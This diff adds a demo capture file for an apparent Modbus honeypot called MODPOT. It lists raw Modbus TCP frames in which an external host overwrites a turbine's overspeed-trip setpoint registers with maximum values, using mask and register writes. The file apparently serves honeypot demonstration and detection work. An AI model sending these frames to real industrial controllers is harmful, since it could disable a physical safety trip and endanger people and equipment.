@@ -1,0 +1,7 @@
+# MODPOT demo capture - one Modbus TCP frame per line.
+# Format:  <src> | <hex bytes>   (comments start with #)
+# Override of a turbine overspeed-trip setpoint via mask + writes.
+10.0.4.10 | 000100000006010300c80006
+91.205.230.12 | 000200000008011600c800007fff
+91.205.230.12 | 000300000006010600c9ffff
+91.205.230.12 | 00040000000b011000ca000204ffffffff
